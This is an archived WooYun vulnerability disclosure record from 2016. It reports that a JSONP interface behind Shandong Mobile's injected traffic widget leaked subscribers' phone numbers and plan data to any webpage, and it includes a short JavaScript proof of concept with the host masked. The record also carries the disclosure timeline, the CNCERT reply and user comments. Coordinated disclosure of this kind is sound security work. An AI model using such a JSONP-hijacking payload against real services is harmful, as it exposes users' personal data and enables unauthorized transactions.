{"id": 86193, "wybug_id": "wooyun-2016-0187912", "wybug_title": "山东移动某接口可任意调用导致手机号码泄露办理各种业务", "wybug_corp": "山东移动", "wybug_author": "virusdefender", "wybug_date": "2016-03-23 11:20", "wybug_open_date": "2016-05-09 18:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["个人信息安全", "运营商安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-09：\t细节向公众公开  简要描述： 我好像知道xx一下就能给你打电话的原因了 详细说明：  山东移动在使用3/4G的时候，会在网页中插入一段js，然后在网页右下角显示一个流量球，显示你当前剩余流量，点击流量球还可以办理业务。\n\n\n\n但是在js进行ajax请求查询的时候没有进行有效的安全校验，导致用户在使用3/4G的时候该接口可以被任意网页js调用，可以获取用户手机号码，当前已经办理的业务，当前的套餐情况，办理各种套餐等。\n\n获取手机号的poc\nvar angular = {\"callbacks\": {\"_y\": function(data){console.log(data);alert(data.respparam.phoneNumber);}}};$.ajax({        url: \"http://**.**.**.**:8080/html/servicereq/queryMessageList?callback=angular.callbacks._y&csession=-1648015146&reqparam=%7B%22flag%22:%22-1%22,%22startNum%22:%221%22,%22number%22:%2210%22%7D&templateId=fullscreenbar\",        method: \"get\",        dataType: \"jsonp\",        jsonp: \"angular.callbacks._y\",})\n办理业务和获取套餐信息同理   漏洞证明：  \n\n\n\n\n\n   修复方案：  你们更懂   版权声明：转载请注明来源 virusdefender@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2016-03-25 18:00 厂商回复： CNVD确认所述情况,已经转由CNCERT向中国移动集团公司通报,由其后续协调网站管理部门处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-23 12:42 |    \t\tj14n \t\t\t( 普通白帽子  |\t\t\t        Rank:1712 漏洞数:315        | ... . -.-.   - . .- --)\t\t \n  给我冲个花费    \n     2016-03-23 15:01 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @j14n 这个漏洞能帮你花话费 ：P    \n     2016-03-23 15:18 |    \t\tj14n \t\t\t( 普通白帽子  |\t\t\t        Rank:1712 漏洞数:315        | ... . -.-.   - . .- --)\t\t \n  @疯狗 -_-!还是留着打电话吧!    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}